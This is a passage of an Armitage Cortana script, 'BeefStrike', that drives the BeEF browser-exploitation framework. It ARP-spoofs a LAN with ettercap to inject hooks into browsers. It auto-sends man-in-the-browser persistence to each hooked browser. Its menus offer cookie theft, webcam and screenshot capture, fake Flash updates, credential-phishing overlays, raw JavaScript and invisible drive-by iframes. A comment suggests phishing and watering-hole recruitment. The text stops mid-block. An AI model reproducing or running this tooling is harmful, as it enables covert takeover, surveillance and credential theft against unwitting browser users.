############################ WARNING !!!##################################################
##										        ##
##		Before beginning to use this script, change all the 			##									 															  
##	"import" lines ... Obviously you must put the right path for each Library. 	##
##	But keep the lib folder (and his content) in the same folder than "BeefLib.jar"	##
##											##
##  BeefStrike is a script for Beef and Armitage integration. May be you must read the  ##
##		README file and watch Youtube video demo before use it  		##
##											##	
##											##	
##                  >   by Beny Green    <						##
##		 [  aka @TheBenyGreen	  ]			                        ##				 				
##	 			 							##													 																  
##########################################################################################
import com.eyesopencrew.* from: C:\BeefLib\dist\BeefLib.jar;
import org.apache.commons.* from: C:\BeefLib\dist\lib\commons-lang-2.5.jar;
import org.apache.commons.* from: C:\BeefLib\dist\lib\commons-logging-1.1.3.jar;
import org.apache.commons.* from: C:\BeefLib\dist\lib\commons-beanutils-1.8.3.jar;
import org.apache.commons.* from: C:\BeefLib\dist\lib\commons-collections-3.2.1.jar;
import net.sf.json.* from:  C:\BeefLib\dist\lib\json-lib.jar;
import net.sf.ezmorph.* from:  C:\BeefLib\dist\lib\ezmorph-1.0.6.jar;

################### CORE variables ###############################################

#global('@beef_hosts @beef_hostsoff @beef_cmde @beef_result $key $beefUrl $user $pass');
@beef_hosts = @(%());  # array of beef online zombies
@beef_hostsoff = @(%());  # array of beef offline zombies
@beef_cmde = @(%());  # array of beef commandes - list
@beef_result = @(%());  # array of beef command result - list [NOT USE YET]
$key = "00000000000000000000000" ; # the MUCH important RESTful API key
$recon = 0; # Auto recon status
$zombieNumMonitor = 0 ; # monitor the variation of the zombies number
$size_on = 0; $size_off = 0;
# SNIPER variables
#@analyze = @(%());									  
@browser_profile_list = @(%());
#@targets = @(%());
#@beef_autorun = @(%());
$assault_mode = 1;
$targets_id = 0 ;
$id_analyz = 0;
$id_beef_autorun = 0 ;
######################## Introduction ###########################################
on ready {
	$console = console();
	$console = open_console_tab ("Beef Strike","all","zmb_hook",1);
	cmd($console , " \c8 Using beefmetasploitplugin is no longer a need for BeefStrike. But we always take care for some users usage.");
	cmd($console , "load beef");
	say("Beef_Strike is running");
	}

on console_beef_connect {
	}

#########################  BeEF  MENU BAR    ##############################
popup attacks {
	menu "BeEF Strike"{
		menu "Start" {
			item "Connect" {
			cmd($console , "beef_disconnect");
			$beefUrl = prompt_text("BeEF Server (with http://). Don't use loopback","http://192.168.1.22:4000");
			$user = prompt_text("User","beef");
			$pass = prompt_text("Password","beef");
			$connect = "curl -H \"Content-Type: application/json; charset=UTF-8\"  -X POST -d '{\"username\":\"$user\", \"password\":\"$pass\"}' " . $beefUrl . "/api/admin/login";
			cmd($console , "$connect");
			cmd($console , "beef_connect $beefUrl $user $pass");sleep(30);
			show_message(" [+] Copy and add your RESTful_API_Key (Token)"); 
			}
			item " Key" {
				$key = prompt_text("Copy and Paste RESTful_API_Key here","$key");
					if ($key ne "00000000000000000000000" ){ 	
					fill(); sleep(1000);
					show_message("Well done, now wait for new zombie.");
					}else{show_message("Your key cannot be the default 0000000000000000 ");}
				println("Here is the REST_ful API Key: $key ");
			}
		}
		menu "Recruitment" {
#use ettercap filter for html injection - low injection success rate.
			item "ettercap method" {
					$eth0 = prompt_text("Network interface of the LAN to infect","eth0");
					$filter = prompt_text("Put the absolute path of your filter","/opt/metasploit/msf3/data/armitage/cortana-scripts/beef_strike/infect.filter");
					cmd_async(" xterm -e 'etterfilter $filter -o html.ef'");
					cmd_async(" xterm -e 'ettercap -T -q -i $eth0 -F html.ef -M ARP // //'");
					cmd($console , "\c9[+] ettercap filter > Contamination beging ...");
					show_message("ettercap filter > Contamination beging ...");
			}
			item "Other method"{
	# this feature will use iframe_injector script from mitmproxy to increase injection success rate over a LAN.
				show_message("[Recruitment method idea] \n XSS scanning : find permanent xss vulns and inject beef hooks.\n Spear phishing campaign: send email with a link to your BeEF's hook\n Watering Hole and cloned web-site with your beef hook embeded.\n Demos: youtube.com/thebenygreen");				}
			}
		item "Horde of zombies" {
			local('$zombitableoff');
			$zombitableoff = open_table_tab("zombies-OFF", "", @("id", "ip","name","version","OS","platform", "domain", "port", "URI", "sessionID"), @(), @("RefreshOFF"), "zmb_hookoff", 1);
			refresh_hostsoff($zombitableoff);
			# two tab is open for Online and offline zombies.
			local('$zombitable');
			$zombitable = open_table_tab("zombies", "", @("id", "ip","name","version","OS","platform", "domain", "port", "URI", "sessionID"), @(), @("Refresh", "More details"), "zmb_hook", 1);
			refresh_hosts($zombitable);
			}
		item "Results table" {
			local('$resultable');
			$resultable = open_table_tab("Results", "", @("command_ID", "sessionID","result"), @(), @("Refresh results"), "result_hook", 1);
			refresh_result($resultable);
		}
		item "BeEF-Console" {
				$console = open_console_tab ("Beef Strike","all","zmb_hook",1);
				cmd($console , "load beef");
				cmd($console , "beef_connect $beefUrl $user $pass");
				}
		item "Web UI panel" {
				$beefUrlpanel = "/ui/panel";
				url_open("$beefUrl $+ $beefUrlpanel");
				}
		item "Disconnect" {
				cmd($console , "beef_disconnect");
				cmd($console , "load beef");
			 }
	}
}

on host_add {cmd($console , "\n \c9 [+] New zombie with IP: $1");}

# The heart beat of BeefStrike, specify the frequency of each update : zombie online and offline list, zombie importation
on heartbeat_10s {
	zombiupdate();
	}

################### Menu of action to interact with each zombie #################
popup zmb_hook {
			@idr = flatten(table_selected($1, "id"));
			@adr = flatten(table_selected($1, "address"));
			@sessidr = flatten(table_selected($1, "sessionID"));
			$idr = @idr[0]; 
			$adr = @adr[0];
			$sessidr = @sessidr[0];
		item "Informations" { 
			zombi_info($idr);
			}
		menu "Recon." {
			item "Port scan" { 
				$cmde_param = prompt_text("Ports to scan (example:)","\"ipHost\":\"$adr\",\"\":\"\",\"\":\"\",\"ports\"=\"80,445,22,21\"");
				send_beefcmd_with_param($sessidr, $code_portscan, $cmde_param, 0);
			}
			item "Ping Sweep" { 
				send_beefcmd_with_param($sessidr, $code_pingjav, "", 1);
				}
			item "DNS Enumeration" { 
				send_beefcmd_with_param($sessidr, $code_dnsenum, "", 1);
				}
			item "Fingerprint Network" { 
				send_beefcmd_with_param($sessidr, $code_fingnetwork, "", 1);
				}
			}
		menu "Attack" {
			item "Drive-by" { 
				local ('$inviframe');
				$inviframe = prompt_text("URL (with http://)","http://");
				append($console, "\c4[*] Come here baby !");
				append($console , "Send invisible iframe : " . $inviframe . " --> " . $sessidr . "" );
				run_driveby($beefUrl, $sessidr, $key, $inviframe);
				}
			item "Raw JS" {
				$cmde_param = prompt_text("JS code (here is the example to follow)","\"cmd\":\"alert('WTF');\"");
				send_beefcmd_with_param($sessidr, $code_rawjs, $cmde_param, 0);
				} 		
	 		}
		menu "Special" {
			item "Get_cookie" {	
				send_beef_cmd_without_param($sessidr, $code_getcookie);
				}
			item "Screenshot" {
				send_beefcmd_with_param($sessidr, $code_screenshot,"", 1);
				}
			item "Webcam" {
				send_beefcmd_with_param($sessidr, $code_webcam,"", 1);
				}
			#menu "Geolocation" { #110
			#		local ('$maptype $json_freegeoip');
			#		item "Satellite type" {
			#		append($console , "Geolocate > " . $adr . "" );
			#		send_beef_cmd_without_param($sessidr, $code_geoloc);
					#check_beef_cmd_result($sessidr, 110);
			#		$freegeoip_url = "http://freegeoip.net/json/" . $adr . "";
			#		$maptype = "satellite";
			#		$json_freegeoip = [BeefRequester BeefGetRequest: "$freegeoip_url"];
			#		geomap($json_freegeoip, $maptype);
			#		}
			#		item "Roadmap type" {
			#		append($console , "Geolocate > " . $adr . "" );
			#		send_beef_cmd_without_param($sessidr, 110);
			#		#check_beef_cmd_result($sessidr, 110);
			#		$freegeoip_url = "http://freegeoip.net/json/" . $adr . "";
			#		$maptype = "roadmap";
			#		$json_freegeoip = [BeefRequester BeefGetRequest: "$freegeoip_url"];
			#		geomap($json_freegeoip, $maptype);
			#		}		
			#	}
			item "Send command " { 
				local ('$idcmde');
				append($console , "Send Command ID to >>>" . $adr . "" );
				$idcmde = prompt_text("Command ID","27");
				send_beefcmd_with_param($sessidr, $idcmde, "", 1);
				}
			}
		menu "Social Eng." {
			item "Clickjacking" {	
				send_beefcmd_with_param($sessidr, $code_clickjak,"", 1);
				}
			item "TabNabbing" {	
				send_beefcmd_with_param($sessidr, $code_tabnabbing,"", 1);
				}
			item "Fake flash update" {	
				send_beefcmd_with_param($sessidr, $code_fakeflash,"", 1);
				}
			item "Pretty thief" {	
				send_beefcmd_with_param($sessidr, $code_theft,"", 1);
				}
		}
		item "Unhook" {
				append($console , "Unhook : " . $idr . " -> pushed out off the horde" );
				send_beef_cmd_without_param($sessidr, $code_unhook);
		}
	}	
# This function send beEF command without param !
sub send_beef_cmd_without_param {
			$link = "" . $beefUrl . "/api/modules/" . $1 . "/" . $2 . "?token=$key";
			$send_url = "curl -H \"Content-Type: application/json; charset=UTF-8\" -d '{}' -X POST " . $link . "";
			cmd($console , "$send_url");sleep(20);
			}

sub check_beef_cmd_result {
# Only the first command ID for the moment
			local('$resultable');
			$resultable = open_table_tab("Results", "", @("command_ID", "sessionID","result"), @(), @("Refresh results"), "result_hook", 1);
			refresh_result($resultable);
			#$rslt_link = "" . $beefUrl . "/api/modules/" . $1 . "/" . $2 . "/1?token=$key";
			#append($console, "\c9 [*] Result of module ID $2 ");
			#cmd($console , "$send_url");
			#$cmderslt = [BeefRequester BeefGetRequest: "$rslt_link"];
			#sleep(20);
			#show_message("RESULT FOR $2 \n $cmderslt");
			#return $cmderslt ;
			#%result = %(command_ID => $idcmde, sessionID => "$session", result => "$capt");
			#@beef_result[$idcmde] = %result;
			#@beef_result[] = @(%());$cmderslt
			#$jsoncmderesult = [new JSONObject];
			#$jsoncmderesult= [JSONSerializer toJSON: "$cmderslt"];
			#$name = [[$jsoncmdeinfo get: "name"] toString];
			}			

# Send beef command with params using sesion ID and RESTfull_API key 	
sub send_beefcmd_with_param {
	if ($4 == 1) { $cmde_param = prompt_text("Configure option(s) or leave empty for default values.","\"param1\":\"value1\",\"param2\"=\"value2\""); }
	else { $cmde_param = $3; }
	$link2 = "" . $beefUrl . "/api/modules/" . $1 . "/" . $2 . "?token=$key"; # $4 is the param
	$attak2 = "curl -H \"Content-Type: application/json; charset=UTF-8\" -d '{" . $cmde_param . "}' -X POST " . $link2 . "";
	cmd($console , "$attak2");sleep(20);
	}			
sub refresh_hosts {
	table_set($1, @beef_hosts);
	}
	
sub refresh_hostsoff {
	table_set($1, @beef_hostsoff);
}
sub refresh_result {
	table_set($1, @beef_result);
}

on tab_table_click {
	if ($3 eq "Refresh") {
		refresh_hosts($1);
	}
	if ($3 eq "RefreshOFF") {
		refresh_hostsoff($1);
	}
	if ($3 eq "Fill it") {
		fill_cmde_tab($1);
	}
	if ($3 eq "Refresh results") {
		refresh_result($1);
	}
	if ($3 eq "See autorun list") {
		local('$beef_autorun');
		$beef_autorun = open_table_tab("BeEF autorun", "", @("cc", "id", "name", "category", "browser", "Param"), @(), @("Refresh list","Delete entry","Edit Param", "Load Clent-side Recon cmds", "Replay"), "sniper_hook", 1);
		refresh_list($beef_autorun);
		}
	if ($3 eq "More details") {
		local('$beef_details');
		$beef_details = open_table_tab("Zombies details", "", @("id", "sessionID", "Browser", "ReportedName", "Type","Version", "OS", "Platform", "ActiveX", "Flash", "Java", "VBScript", "Plugins", "GoogleGears", "WebSocket", "HostName"), @(), @("Refresh details"), "", 1);
		refresh_details($beef_details);
		}
	if ($3 eq "Edit Param") {
		editparam($1);
		}
	if ($3 eq "Refresh profiles") {
		refresh_profiles($1);
	}
	if ($3 eq "Edit") {
		edit_profiles($1);
	}
	if ($3 eq "Add") {
		add_profiles($1);
	}
	if ($3 eq "Delete") {
		delete_profiles($1);
	}
	if ($3 eq "Refresh match") {
		refresh_analyze($1);
	}
	if ($3 eq "Change URL") {
		changeurl($1);
	}
	if ($3 eq "Sniper shot") {
		shot($1);
	}
	if ($3 eq "Refresh list") {
		refresh_list($1);
	}
	if ($3 eq "Delete entry") {
		delete_entry($1);
	}
	if ($3 eq "Load Clent-side Recon cmds") {
		load_clientside_recon_mod();
		refresh_list($1);
	}
	if ($3 eq "Refresh details") {
		refresh_details($1);
	}
	if ($3 eq "Replay") {
		show_message("Autorun keep track of zombies already parsed. \n This action clear that track so that autorun can be replay");
		clear(@autorundisabled);
	}
}

# So what append when we have a new zombie ?
on zombies_news { 
	$b = $size_on - 1 ; # magic ops to retrieve good Id ... :-)
	$c = $2 - $1;
	if ($c == 1){ build_profile($b);}
	else{ 
		for ($i = $prevnum; $i < $newnum; $i++) {
			build_profile($i);
			}
		}
	build_profile($b);
}
# Build and store browser's profile of the new zombie
sub build_profile {
		host_add(@beef_hosts[$1]["ip"]);
		$sid = @beef_hosts[$1]["sessionID"];
		append($console, "\c9 [+] Send MiTB module for Persistence.");	
		send_beefcmd_with_param($sid, 32, "", 0); # MITB Persistence #
		host_os(@beef_hosts[$1]["ip"],@beef_hosts[$1]["OS"]);
		$link = "" . $beefUrl . "/api/hooks/" . $sid . "?token=" . $key . "";
		$details = [BeefRequester BeefGetRequest: "$link"];#sleep(100);
		$js = [new JSONObject];
		$js = [JSONSerializer toJSON: "$details"];
		$BrowserName = [[$js get: "BrowserName"] toString];#used by sniper
		$BrowserPlugins = [[$js get: "BrowserPlugins"] toString];#used by sniper
		$BrowserReportedName = [[$js get: "BrowserReportedName"] toString]; println($BrowserReportedName);
		$BrowserType = [[$js get: "BrowserType"] toString];
		$BrowserVersion = [[$js get: "BrowserVersion"] toString];#used by sniper
		$HasActiveX = [[$js get: "HasActiveX"] toString];#used by sniper
		$HasFlash = [[$js get: "HasFlash"] toString];#used by sniper
		$HasGoogleGears = [[$js get: "HasGoogleGears"] toString];
		$HasWebSocket = [[$js get: "HasWebSocket"] toString];
		$HostName = [[$js get: "HostName"] toString];
		$JavaEnabled = [[$js get: "JavaEnabled"] toString];#used by sniper
		$OsName = [[$js get: "OsName"] toString];#used by sniper
		$SystemPlatform = [[$js get: "SystemPlatform"] toString];#used by sniper
		$VBScriptEnabled = [[$js get: "VBScriptEnabled"] toString];#used by sniper
		%browser_profile = %(id => "$1", sessionID => "$sid", Browser => "$BrowserName", ReportedName => "$BrowserReportedName", Type => "$BrowserType", Version => "$BrowserVersion", OS => "$OsName", Platform => "$SystemPlatform", ActiveX => "$HasActiveX", Flash => "$HasFlash", Java => "$JavaEnabled", VBScript => "$VBScriptEnabled", Plugins => "$BrowserPlugins", GoogleGears => "$HasGoogleGears", WebSocket => "$HasWebSocket", HostName => "$HostName" );
		@browser_profile_list[$1] = %browser_profile;
		elog("Beef browser profiling - Informations about this zombie - \n BrowserName: " . $BrowserName . "\n +--------------------------------------------------+\n BrowserPlugins: " . $BrowserPlugins . "\n BrowserReportedName: " . $BrowserReportedName . "\nBrowserType: " . $BrowserType . "\n BrowserVersion: " . $BrowserVersion . "\n +--------------------------------------------------+\n HasActiveX: " . $HasActiveX . "\n HasFlash: " . $HasFlash . "\n HasGoogleGears: " . $HasGoogleGears . "\n HasWebSocket: " . $HasWebSocket . "\n HostName: " . $HostName . "\n JavaEnabled: " . $JavaEnabled . "\n OsName: " . $OsName . "\n SystemPlatform: " . $SystemPlatform . "\n VBScriptEnabled: " . $VBScriptEnabled . "\n +--------------------------------------------------+");
	#	fire_event("analyze_target", $1);
	fire_event("play_autorun_cmd", $1);
}

on analyze_target {
	match_it($1);}
on play_autorun_cmd {
	append($console, "\c8 [*] Check and execute Autorun commands --->");	
	beef_autorun($1);}

# This action try to keep your zombie list up to date inside Armitage
sub zombiupdate {
  if ($key ne "00000000000000000000000" ){ 
  $hooks_list_link = "" . $beefUrl . "/api/hooks?token=" . $key . "";
  $jsonTxt = [BeefRequester BeefGetRequest: "$hooks_list_link"];sleep(100);
#JSON Processing ---- ONLINE ZOMBIES -----* * *------------------	
  clear(@beef_hosts);
  $on = [OnlineClass extractOnline: $jsonTxt ];
	
  for ($i = 0; $i < [$on size]; $i++)   {
		$id = $i ;
		$ip = [OnlineClass extractZombieData: $jsonTxt, $i, "ip"]; 
		$name = [OnlineClass extractZombieData: $jsonTxt, $i, "name"];  
		$version = [OnlineClass extractZombieData: $jsonTxt, $i, "version"]; 
		$os = [OnlineClass extractZombieData: $jsonTxt, $i, "os"];  
		$platform = [OnlineClass extractZombieData: $jsonTxt, $i, "platform"]; 
		$domain = [OnlineClass extractZombieData: $jsonTxt, $i, "domain"]; 
		$port = [OnlineClass extractZombieData: $jsonTxt, $i, "port"]; 
		$page_uri = [OnlineClass extractZombieData: $jsonTxt, $i, "page_uri"]; 
		$session = [OnlineClass extractZombieData: $jsonTxt, $i, "session"];
		%hoston = %(id => $id, ip => "$ip", name => "$name", version => "$version", OS => "$os", platform => "$platform", domain => "$domain", port => "$port", URI => "$page_uri", sessionID => "$session");
		@beef_hosts[$i] = %hoston;	
		}
#JSON Processing ---- OFFLINE ZOMBIES -----* * *------------------
  clear(@beef_hostsoff);
  $off = [OfflineClass extractOffline: $jsonTxt ];
	
  for ($i = 0; $i < [$off size]; $i++)   {
		$id = $i ;
		$ip = [OfflineClass extractZombieData: $jsonTxt, $i, "ip"]; 
		$name = [OfflineClass extractZombieData: $jsonTxt, $i, "name"];  
		$version = [OfflineClass extractZombieData: $jsonTxt, $i, "version"]; 
		$os = [OfflineClass extractZombieData: $jsonTxt, $i, "os"];  
		$platform = [OfflineClass extractZombieData: $jsonTxt, $i, "platform"]; 
		$domain = [OfflineClass extractZombieData: $jsonTxt, $i, "domain"]; 
		$port = [OfflineClass extractZombieData: $jsonTxt, $i, "port"]; 
		$page_uri = [OfflineClass extractZombieData: $jsonTxt, $i, "page_uri"]; 
		$session = [OfflineClass extractZombieData: $jsonTxt, $i, "session"];
		%hostoff = %(id => $id, ip => "$ip", name => "$name", version => "$version", OS => "$os", platform => "$platform", domain => "$domain", port => "$port", URI => "$page_uri", sessionID => "$session");
		@beef_hostsoff[$i] = %hostoff;	
		}
		$size_on = size(@beef_hosts);  $size_off = size(@beef_hostsoff);
# Fire event when there is a positive variation of zombies's number.	
  if ($zombieNumMonitor < $size_on){
		
		append($console, "\c9 [+] New zombie(s) join the horde");
		println("\c9 [+] New zombie(s) join the horde");
		say("New zombie(s) join the horde");
		$prevnum = $zombieNumMonitor ;
		$zombieNumMonitor = $size_on ;
		$newnum = $zombieNumMonitor ; 
		fire_event("zombies_news", $prevnum, $newnum);
		} 
	if ($zombieNumMonitor > $size_on){
		append($console, "\c4 [-] Some zombies have leave the horde");
		println("\c4 [-] Some zombies have leave the horde");
		say("Some zombies have leave the horde");
		$zombieNumMonitor = $size_on ;
		}
	} else { append($console, "\c4[!]No Key available");}
}

#################################### GIVE ME MY SHELL ! ###########################
# I love this action, it send invisible iframe to your target so easily that you can play with client-side exploit like you do with remote exploit. :-D awesome !
sub run_driveby {
	$link = "" . $1 . "/api/modules/" . $2 . "/" . $code_inviframe . "?token=$3";
	$attak = "curl -H \"Content-Type: application/json; charset=UTF-8\" -d '{\"target\":\"" . $4 . "\"}' -X POST " . $link . "";
	cmd($console , "$attak");
	say("Send invisible iFrame: " . $4 . " via Beef_Strike ");
	}
# this action show an info box with details about a particular zombie
sub zombi_info {
   $BrowserName = @browser_profile_list[$1]["Browser"] ;
   $BrowserPlugins = @browser_profile_list[$1]["Plugins"] ;
   $BrowserReportedName = @browser_profile_list[$1]["ReportedName"] ;
   $BrowserType = @browser_profile_list[$1]["Type"] ;
   $BrowserVersion = @browser_profile_list[$1]["Version"] ;
   $HasActiveX = @browser_profile_list[$1]["ActiveX"] ;
   $HasFlash = @browser_profile_list[$1]["Flash"] ;
   $HasGoogleGears = @browser_profile_list[$1]["GoogleGears"] ;
   $HasWebSocket = @browser_profile_list[$1]["WebSocket"] ;
   $HostName = @browser_profile_list[$1]["HostName"] ;
   $JavaEnabled = @browser_profile_list[$1]["Java"] ;
   $OsName = @browser_profile_list[$1]["OS"] ;
   $SystemPlatform = @browser_profile_list[$1]["Platform"] ;
   $VBScriptEnabled = @browser_profile_list[$1]["VBScript"];
   show_message( "BrowserName: " . $BrowserName . "\n +--------------------------------------------------+\n BrowserPlugins: " . $BrowserPlugins . "\n BrowserReportedName: " . $BrowserReportedName . "\nBrowserType: " . $BrowserType . "\n BrowserVersion: " . $BrowserVersion . "\n +--------------------------------------------------+\n HasActiveX: " . $HasActiveX . "\n HasFlash: " . $HasFlash . "\n HasGoogleGears: " . $HasGoogleGears . "\n HasWebSocket: " . $HasWebSocket . "\n HostName: " . $HostName . "\n JavaEnabled: " . $JavaEnabled . "\n OsName: " . $OsName . "\n SystemPlatform: " . $SystemPlatform . "\n VBScriptEnabled: " . $VBScriptEnabled . "\n +--------------------------------------------------+");
   append($console ,"\c8 ZOMBIE INFOS \n BrowserName: " . $BrowserName . "\n +--------------------------------------------------+\n BrowserPlugins: " . $BrowserPlugins . "\n BrowserReportedName: " . $BrowserReportedName . "\nBrowserType: " . $BrowserType . "\n BrowserVersion: " . $BrowserVersion . "\n +--------------------------------------------------+\n HasActiveX: " . $HasActiveX . "\n HasFlash: " . $HasFlash . "\n HasGoogleGears: " . $HasGoogleGears . "\n HasWebSocket: " . $HasWebSocket . "\n HostName: " . $HostName . "\n JavaEnabled: " . $JavaEnabled . "\n OsName: " . $OsName . "\n SystemPlatform: " . $SystemPlatform . "\n VBScriptEnabled: " . $VBScriptEnabled . "\n +--------------------------------------------------+");

   }

###################   JSON Processing ---- BEEF COMMANDS ---- #####################
sub fill_cmde_tab {
	sleep(1000);
	table_set($1, @beef_cmde);
	}

sub cmde_info {
	$link2 = "" . $beefUrl . "/api/modules/" . $1 . "?token=" . $key . "";
	$cmdeid = [BeefRequester BeefGetRequest: "$link2"]; sleep(100);
	$jsoncmdeinfo = [new JSONObject];
	$jsoncmdeinfo = [JSONSerializer toJSON: "$cmdeid"];
    $name = [[$jsoncmdeinfo get: "name"] toString];
    $description = [[$jsoncmdeinfo get: "description"] toString];
    $options = [[$jsoncmdeinfo get: "options"] toString];
    show_message( "Name: " . $name . "\n +---------------------------------------------+\n Description: " . $description . "\n Options: " . $options . "\n +-------------------------------------------+");
    append($console , " \c8 COMMANDE INFOS \n Name: " . $name . "\n +---------------------------------------------+\n Description: " . $description . "\n Options: " . $options . "\n +-------------------------------------------+");
}

sub fill {
	$cmd_list_link = "" . $beefUrl . "/api/modules?token=" . $key . "";
	$jsonTxt_cmde = [BeefRequester BeefGetRequest: "$cmd_list_link"];
   $c = [CommandList extractCommands: $jsonTxt_cmde] ;
	for ($i = 0; $i < [$c size]; $i++)   {
		$id = [CommandList extractcmdData: $jsonTxt_cmde, $i, "id"]; 
		$name = [CommandList extractcmdData: $jsonTxt_cmde, $i, "name"];  
		$category = [CommandList extractcmdData: $jsonTxt_cmde, $i, "category"]; 
		%cmde = %(id => "$id", name => "$name", category => "$category");
		@beef_cmde[$i] = %cmde;
		#PERSISTENCE
		if ( $name eq "Man-In-The-Browser") { $code_mitb = $id;}
		if ( $name eq "Unhook") { $code_unhook = $id;}
		# RECON
		if ( $name eq "Port Scanner") { $code_portscan = $id;}
		if ( $name eq "DNS Enumeration") { $code_dnsenum = $id;}
		if ( $name eq "Fingerprint Network") { $code_fingnetwork = $id;}
		if ( $name eq "Fingerprint Browser") { $code_fingbrowser = $id;}
		if ( $name eq "Get Internal IP") { $code_ipnat = $id;}
		if ( $name eq "Get System Info") { $code_sysinfo = $id;}
		if ( $name eq "Get Wireless Keys") { $code_wireless = $id;}
		if ( $name eq "Replace HREFs (HTTPS)") { $code_replacehttps = $id;}
		if ( $name eq "Ping Sweep (Java)") { $code_pingjav = $id;}
		if ( $name eq "Get Visited URLs") { $code_visitedurl = $id;}
		if ( $name eq "Dectect Software") { $code_detectsoft = $id;}
		if ( $name eq "Get Visited Domains") { $code_visitedomain = $id;}
		#ATTACK
		if ( $name eq "Create Invisible Iframe") { $code_inviframe = $id;}
		if ( $name eq "Raw JavasScript") { $code_rawjs = $id;}
		#SPECIAL
		if ( $name eq "Get Cookie") { $code_getcookie = $id;}
		if ( $name eq "Spyder Eye") { $code_screenshot = $id;}
		if ( $name eq "Get Geolocation") { $code_geoloc = $id;}
		if ( $name eq "Webcam") { $code_webcam = $id;}
		#SOCIAL ENG
		if ( $name eq "Fake Flash Update") { $code_fakeflash = $id;}
		if ( $name eq "Clickjacking") { $code_clickjak = $id;}
		if ( $name eq "TabNabbing") { $code_tabnabbing = $id;}
		if ( $name eq "Pretty Theft") { $code_theft = $id;}
		}
}
popup sniper_hook {
			@ccr = flatten(table_selected($1, "id"));
			$ccr = @ccr[0];
			item "Informations" { 
				cmde_info($ccr);
				}
			}
popup cmde_hook {
			@idr = flatten(table_selected($1, "id"));
			@namedr = flatten(table_selected($1, "name"));
			@catdr = flatten(table_selected($1, "category"));
			$idr = @idr[0];
			$namedr = @namedr[0];
			$catdr = @catdr[0];
			item "Informations" { 
				cmde_info($idr);
				}
			menu "Add to autorun list" {
					item "For All" {%cmde = %(cc => "$id_beef_autorun", id => "$idr", name => "$namedr", category => "$catdr", browser => "All", Param => "");
						@beef_autorun[$id_beef_autorun] = %cmde;
						$id_beef_autorun = $id_beef_autorun + 1 ;			}
					item "IExplorer (IE)"{%cmde = %(cc => "$id_beef_autorun", id => "$idr", name => "$namedr", category => "$catdr", browser => "IE", Param => "");
						@beef_autorun[$id_beef_autorun] = %cmde;
						$id_beef_autorun = $id_beef_autorun + 1 ;	}
					item "Firefox (FF)"{%cmde = %(cc => "$id_beef_autorun", id => "$idr", name => "$namedr", category => "$catdr", browser => "FF", Param => "");
						@beef_autorun[$id_beef_autorun] = %cmde;
						$id_beef_autorun = $id_beef_autorun + 1 ;	}
					item "Chrome (C)"{%cmde = %(cc => "$id_beef_autorun", id => "$idr", name => "$namedr", category => "$catdr", browser => "C", Param => "");
						@beef_autorun[$id_beef_autorun] = %cmde;
						$id_beef_autorun = $id_beef_autorun + 1 ;	}
					item "Opera (O)"{%cmde = %(cc => "$id_beef_autorun", id => "$idr", name => "$namedr", category => "$catdr", browser => "O", Param => "");
						@beef_autorun[$id_beef_autorun] = %cmde;
						$id_beef_autorun = $id_beef_autorun + 1 ;	}
					item "Safary (S)"{%cmde = %(cc => "$id_beef_autorun", id => "$idr", name => "$namedr", category => "$catdr", browser => "S", Param => "");
						@beef_autorun[$id_beef_autorun] = %cmde;
						$id_beef_autorun = $id_beef_autorun + 1 ;	}
			}
}

###########################  HOST Sub-Menu ###########################
popup host_bottom {
	item "BeEF" {local('$zombitableoff');
			$zombitableoff = open_table_tab("zombies-OFF", "", @("id", "ip","name","version","OS","platform", "domain", "port", "URI", "sessionID"), @(), @("RefreshOFF"), "zmb_hookoff", 1);
			refresh_hostsoff($zombitableoff);
			# two tab is open for Online and offline zombies.
			local('$zombitable');
			$zombitable = open_table_tab("zombies", "", @("id", "ip","name","version","OS","platform", "domain", "port", "URI", "sessionID"), @(), @("Refresh","More details"), "zmb_hook", 1);
			refresh_hosts($zombitable);
			}
}
######################## HOST ICON ###################################
# when zombie is offline icon will turn red. This filter show you the browser hooked icon
filter host_image {
	local('$ip $ipoff $name $nameoff');
	$address = $2['address'];
# Blue beef ICON for online zombie
	
	for ($i = 0; $i < size(@beef_hostsoff); $i++ ) {
		%hostoff = @beef_hostsoff[$i];
		$ipoff = %hostoff['ip'];
		$nameoff = %hostoff['name'];
		if ($ipoff eq $address ){
				push($1, script_resource("zombieoff.png"));
				break;
			}
	}
	for ($i = 0; $i < size(@beef_hosts); $i++ ) {
		%host = @beef_hosts[$i];
		$ip = %host['ip'];
		$name = %host['name'];
		if ($ip eq $address ){
				push($1, script_resource("zombie.png"));
				if ($name eq "IE"){
				push($1, script_resource("iexplorer_hk.png"));
				} 
				if ($name eq "FF"){
				push($1, script_resource("firefox_hk.png"));
				}
				if ($name eq "C"){
				push($1, script_resource("chrome_hk.png"));
				}
				if ($name eq "O"){
				push($1, script_resource("opera_hk.png"));
				}
				if ($name eq "S"){
				push($1, script_resource("safari_hk.png"));
				}
				if ($name eq "UN"){
				push($1, script_resource("unknow_hk.png"));
				}
			}
		}
		# ICON appearance for sniper .
		for ($i = 0; $i < size(@analyze); $i++ ) {
		%target_dr = @analyze[$i];
		$iptarget = %target_dr['ip'];
		if ($iptarget eq $address ){
			push($1, script_resource("sniper.png"));
			}
		}
	return @_;
}

######################## GEOLOCATE  ZOMBIE ON A MAP ##################
# 	Use freegeoip.net web services 	  						  		 #
sub geomap {
	$js = [new JSONObject];
	$js = [JSONSerializer toJSON: "$1"];
   $ip = [[$js get: "ip"] toString];
   $country = [[$js get: "country_name"] toString];
   $city = [[$js get: "city"] toString];
   $lat = [[$js get: "latitude"] toString];
   $lon = [[$js get: "longitude"] toString];
   $map_url = "http://maps.google.com/maps/api/staticmap?size=512x512&center=" . $lat . "," . $lon . "&maptype=" . $2 . "&zoom=13&sensor=false";
   #url_open("$map_url"); # IN USE BEFORE FINISH THE IMAGE TAB
   $map_tab = open_image_tab("Map", @(), @("Satellite", "Roadmap"));
 #  $map_tab = open_image_tab("Map", $arg, @("Satellite", "Roadmap"));
   set_image($map_tab, "$map_url");
}
on tab_image_click {
	# NOT IMPLEMENTED YET      
	}                       
								
#                               ____________
#                              | Ooh Yeah ! |
#                              |____________|
# ______________________________||________||___
#[_______________________,----------._ [====]o'""-,__....----=====
#                  [____(oooooooooooo)___________/__________     |
#        Browser Sniper  //""""""""""  |====| [_)           \    |
#                       // \\          |====| 	             \   |
#                      //   \\         |====|                 """"
#                     (_)   (_)        `----'
 
popup attacks {
	menu "Browser Sniper"{

	item "Commands" {
			local('$commandtab');
			$commandtab = open_table_tab("Commands", "", @("id","name","category"), @(), @("Fill it", "See autorun list"), "cmde_hook", 1);
			fill_cmde_tab($commandtab);
			}
	
	item "Autorun list" {
		local('$beef_autorun');
